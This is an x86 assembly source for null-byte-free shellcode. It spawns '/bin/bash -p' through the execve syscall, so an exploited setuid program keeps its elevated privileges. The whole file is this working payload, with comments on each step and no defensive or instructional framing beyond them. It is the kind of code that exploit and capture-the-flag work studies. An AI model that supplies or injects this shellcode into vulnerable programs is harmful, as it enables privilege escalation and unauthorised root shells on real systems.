global _start

section .text
; execve("/bin/bash", ["/bin/bash", "-p", 0x0], [0x0]);
_start:
    xor eax, eax       ; set eax to 0x0

    ; write "/bin/bash" to the stack
    push 0x00000068    ;push "h000"
    push 0x7361622f    ;push "/bas"
    push 0x6e69622f    ;push "/bin"
    mov ebx, esp       ;ebx points to "/bin/bash"

    ; write "-p" to the stack
    push 0xffff702d    ;push "-p00" (shift out high bytes)
    shl dword [esp], 0x10
    shr dword [esp], 0x10
    mov ecx, esp       ;ecx points to "-p"

    push eax           ;push null pointer
    push ecx           ;push address of "-p"
    push ebx           ;push address of "/bin/bash"
    mov ecx, esp       ;ecx points to ["bin/bash", "-p", 0x0]

    lea edx, [ecx+0x8] ;edx points to a null pointer

    ; execve() is sycall 11
    add al, 0x5
    add al, 0x6
    int 0x80
